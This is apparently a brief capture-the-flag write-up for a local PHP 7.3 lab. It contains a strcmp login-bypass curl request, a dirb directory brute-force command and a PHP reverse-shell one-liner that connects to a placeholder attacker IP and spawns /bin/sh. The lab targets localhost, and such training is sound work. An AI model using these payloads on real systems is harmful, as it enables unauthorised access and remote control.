# CTF 2: PHP Cracken

This uses the container [HightechSec/web-ctf-container](https://github.com/HightechSec/web-ctf-container/tree/master)
to get the php 7.3 version and installed apache2 on it.

## Challenge 1
Use [PHP Strcmp](https://www.php.net/manual/en/function.strcmp.php) bypass.
This can be done by using the `?password[]=%22%22`.
Due to some inherent weaknesses in PHP's comparisons, NULL == 0 will return true.

```sh
 curl -X POST --data "username=admin&password[]=%22%22&submit=Login" http://127.0.0.1/admin/index.php
```

## Challenge 2
Use a Web Content Scanner to perform a dictionary-based attack against a web server. 
```sh
dirb http://127.0.0.1 /usr/share/wordlists/dirb/common.txt
```

## Challenge 3
Use Reverse Shell to gain a foothold in the system.
Using a tool like `netcat` to host the reverse shell.
```sh
php -r '$sock=fsockopen("<attacker_ip>",<attacker_port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```
